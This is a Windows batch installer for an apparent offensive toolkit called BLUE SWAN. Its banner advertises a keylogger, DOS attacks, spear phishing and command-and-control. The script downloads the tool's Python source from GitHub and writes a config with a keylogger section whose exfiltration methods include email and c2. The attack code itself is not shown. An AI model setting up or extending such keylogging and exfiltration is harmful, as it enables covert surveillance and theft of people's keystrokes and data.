@echo off
REM ============================================
REM BLUE SWAN - Windows Installation Script
REM Author: Ian Carter Kulani
REM Version: 1.0.0
REM ============================================

setlocal enabledelayedexpansion

REM Colors for Windows (ANSI support)
set "RED=[91m"
set "GREEN=[92m"
set "YELLOW=[93m"
set "BLUE=[94m"
set "CYAN=[96m"
set "WHITE=[97m"
set "NC=[0m"

echo %RED%
echo ╔══════════════════════════════════════════════════════════════════════════════╗
echo ║%WHITE%        🦢 BLUE SWAN v1.0.0 - Ultimate Cybersecurity Platform       %RED%║
echo ╠══════════════════════════════════════════════════════════════════════════════╣
echo ║%CYAN%                                                                           %RED%║
echo ║%CYAN%  • 210+ Security Commands              • 📡 Ping / Nmap / Curl / Netcat%RED%║
echo ║%CYAN%  • 🔌 SSH Remote Command Execution     • 🚀 REAL Traffic Generation    %RED%║
echo ║%CYAN%  • 🕷️ Nikto Web Vulnerability Scanner  • 🎣 Social Engineering Suite   %RED%║
echo ║%CYAN%  • ⌨️ Advanced Keylogger (F10)         • 💥 DOS Attack Capabilities    %RED%║
echo ║%CYAN%  • 📧 Spear Phishing Campaigns         • 🤖 Agent Command & Control    %RED%║
echo ║%CYAN%  • 📱 Multi-Platform Bot Integration   • 💻 Web Dashboard              %RED%║
echo ║%CYAN%  • 🔒 IP Management & Threat Detection  • 🌐 IP to Domain Translation   %RED%║
echo ║%CYAN%  • 🏠 Domain Hosting Engine            • 📊 Graphical Reports         %RED%║
echo ║%CYAN%  • 🔗 IP Blockchain Integration        • 🛡️ 10,000+ IP Monitoring      %RED%║
echo ╠══════════════════════════════════════════════════════════════════════════════╣
echo ║%WHITE%                          🎯 Installation Starting...                     %RED%║
echo ╚══════════════════════════════════════════════════════════════════════════════╝%NC%

echo.
echo %BLUE%🔍 Checking system...%NC%

REM Check Python
python --version >nul 2>&1
if errorlevel 1 (
    echo %RED%❌ Python 3 not found. Please install Python 3.11+ from python.org%NC%
    echo %YELLOW%⚠️  Make sure to check "Add Python to PATH" during installation%NC%
    pause
    exit /b 1
)

for /f "tokens=2" %%i in ('python --version 2^>^&1') do set PYTHON_VERSION=%%i
echo %GREEN%✅ Python version: %PYTHON_VERSION%%NC%

REM Check pip
pip --version >nul 2>&1
if errorlevel 1 (
    echo %RED%❌ pip not found. Please install pip.%NC%
    pause
    exit /b 1
)

echo %GREEN%✅ pip found%NC%

REM Set installation paths
set "INSTALL_DIR=%USERPROFILE%\.blue_swan"
set "VENV_DIR=%INSTALL_DIR%\venv"
set "SOURCE_DIR=%INSTALL_DIR%\source"
set "BIN_DIR=%USERPROFILE%\AppData\Local\Programs\Python\Python311\Scripts"

echo %BLUE%📁 Installation directory: %INSTALL_DIR%%NC%

REM Create directories
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
if not exist "%SOURCE_DIR%" mkdir "%SOURCE_DIR%"

REM Setup Python virtual environment
echo %BLUE%🐍 Setting up Python virtual environment...%NC%

if exist "%VENV_DIR%" (
    echo %YELLOW%⚠️  Virtual environment already exists. Recreating...%NC%
    rmdir /s /q "%VENV_DIR%"
)

python -m venv "%VENV_DIR%"
if errorlevel 1 (
    echo %RED%❌ Failed to create virtual environment%NC%
    pause
    exit /b 1
)

echo %GREEN%✅ Virtual environment created%NC%

REM Install Python packages
echo %BLUE%📦 Installing Python packages...%NC%

call "%VENV_DIR%\Scripts\activate"

pip install --upgrade pip setuptools wheel

pip install requests psutil cryptography dnspython python-whois paramiko
pip install Flask Flask-SocketIO Flask-CORS flask-socketio python-socketio
pip install discord.py slack-sdk telethon pywhatkit
pip install pynput pygetwindow pyautogui pyperclip
pip install matplotlib seaborn numpy reportlab
pip install beautifulsoup4 lxml qrcode pyshorteners
pip install google-api-python-client google-auth-httplib2 google-auth-oauthlib httplib2
pip install colorama tqdm python-dotenv PyYAML
pip install scapy

if errorlevel 1 (
    echo %RED%❌ Failed to install Python packages%NC%
    pause
    exit /b 1
)

echo %GREEN%✅ Python packages installed%NC%

REM Download application
echo %BLUE%📥 Downloading BLUE SWAN...%NC%

cd "%INSTALL_DIR%"

if exist "%SOURCE_DIR%\blue_swan.py" (
    echo %YELLOW%⚠️  Source already exists.%NC%
) else (
    echo %CYAN%Downloading from GitHub...%NC%
    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/iankulani/blue-swan/main/blue_swan.py' -OutFile '%SOURCE_DIR%\blue_swan.py'"
    if errorlevel 1 (
        echo %RED%❌ Failed to download. Check internet connection.%NC%
        pause
        exit /b 1
    )
)

echo %GREEN%✅ Application downloaded%NC%

REM Create configuration
echo %BLUE%⚙️  Creating configuration...%NC%

if not exist "%USERPROFILE%\.config\blue_swan" mkdir "%USERPROFILE%\.config\blue_swan"

(
echo {
echo     "version": "1.0.0",
echo     "auto_start": false,
echo     "auto_block_enabled": false,
echo     "auto_block_threshold": 5,
echo     "scan_timeout": 30,
echo     "report_format": "html",
echo     "generate_graphics": true,
echo     "install_path": "%INSTALL_DIR%",
echo     "web": {
echo         "enabled": true,
echo         "port": 5000,
echo         "host": "0.0.0.0",
echo         "require_auth": true
echo     },
echo     "keylogger": {
echo         "enabled": false,
echo         "hotkey": "f10",
echo         "upload_interval": 30,
echo         "screenshot_interval": 60,
echo         "exfil_methods": ["file", "email", "c2"]
echo     },
echo     "ip_monitor": {
echo         "enabled": true,
echo         "max_ips": 10000,
echo         "scan_interval": 300,
echo         "blockchain_enabled": true
echo     }
echo }
) > "%USERPROFILE%\.config\blue_swan\config.json"

echo %GREEN%✅ Configuration created%NC%

REM Create launcher script
echo %BLUE%🔧 Creating launcher script...%NC%

(
echo @echo off
echo REM BLUE SWAN - Windows Launcher
echo.
echo set "INSTALL_DIR=%USERPROFILE%\.blue_swan"
echo set "VENV_DIR=%%INSTALL_DIR%%\venv"
echo set "SOURCE_DIR=%%INSTALL_DIR%%\source"
echo.
echo call "%%VENV_DIR%%\Scripts\activate"
echo python "%%SOURCE_DIR%%\blue_swan.py" %%*
) > "%INSTALL_DIR%\blue_swan.bat"

echo %GREEN%✅ Launcher script created%NC%

REM Create desktop shortcut (optional)
echo %BLUE%Creating desktop shortcut...%NC%

powershell -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%USERPROFILE%\Desktop\BLUE SWAN.lnk'); $Shortcut.TargetPath = '%INSTALL_DIR%\blue_swan.bat'; $Shortcut.WorkingDirectory = '%INSTALL_DIR%'; $Shortcut.Save()"

echo %GREEN%✅ Desktop shortcut created%NC%

REM Final output
echo.
echo %GREEN%══════════════════════════════════════════════════════════════════════════════%NC%
echo %WHITE%                    🦢 BLUE SWAN INSTALLATION COMPLETE!                       %NC%
echo %GREEN%══════════════════════════════════════════════════════════════════════════════%NC%
echo.
echo %CYAN%📁 Installation Directory:%NC% %INSTALL_DIR%
echo %CYAN%🐍 Virtual Environment:%NC% %VENV_DIR%
echo %CYAN%⚙️  Configuration:%NC% %USERPROFILE%\.config\blue_swan
echo.
echo %WHITE%🚀 Quick Start:%NC%
echo   %GREEN%blue_swan%NC%              - Start interactive console
echo   %GREEN%blue_swan --help%NC%       - Show help
echo   %GREEN%blue_swan --web%NC%        - Start web dashboard only
echo.
echo %WHITE%📚 Commands:%NC%
echo   Type %GREEN%help%NC% for available commands
echo   Type %GREEN%status%NC% for system status
echo   Press %GREEN%F10%NC% to start/stop keylogger
echo.
echo %WHITE%🌐 Web Dashboard:%NC%
echo   http://localhost:5000
echo.
echo %WHITE%📖 Documentation:%NC%
echo   https://docs.blue-swan.com
echo.
echo %YELLOW%⚠️  For authorized security testing only%NC%
echo %GREEN%══════════════════════════════════════════════════════════════════════════════%NC%

pause